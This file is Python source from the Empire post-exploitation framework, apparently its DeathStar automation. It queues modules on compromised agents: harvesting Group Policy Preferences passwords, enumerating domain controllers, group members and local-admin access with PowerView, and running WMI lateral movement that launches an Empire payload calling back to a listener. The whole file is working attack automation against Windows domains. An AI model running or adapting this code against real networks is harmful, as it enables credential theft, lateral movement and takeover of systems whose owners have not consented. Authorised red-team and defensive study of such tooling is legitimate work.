from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest


class DeathStarTasks:
    def __init__(self, main_menu):
        self.main_menu = main_menu

    def run_get_gpp(self, db, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_privesc_gpp", options=params
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_get_domain_controller(self, db, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_get_domain_controller",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_get_group_member(self, db, sid, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
            "Identity": sid,
            "Recurse": "True",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_get_group_member",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_find_localadmin(self, db, session_id, domain_controller, domain):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
            "ComputerDomain": domain,
            "Server": domain_controller,
            "ServerTimeLimit": "60",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_find_localadmin_access",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_invoke_wmi(self, db, session_id, listener, computer_name):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            # Needed even though Payload is internal: validate_options gates
            # Listener on the raw params dict, and without this it substitutes
            # Listener's '' default, so invoke_wmi fails "Listener or Command
            # required". Do NOT add Credentials="Manual" to match -- satisfying
            # that gate makes the empty UserName/Password below required.
            "Payload": "Empire",
            "Listener": listener,
            "UserName": "",
            "Password": "",
            "OutputFunction": "Out-String",
            "ComputerName": computer_name,
            # Unused while Obfuscate is False, but kept correct as a pair.
            "Obfuscate": "False",
            "ObfuscateCommand": r"Token\All\1",
            "ProxyCreds": "default",
            "Proxy": "default",
            "UserAgent": "default",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_lateral_movement_invoke_wmi",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            print("Error")
            return False
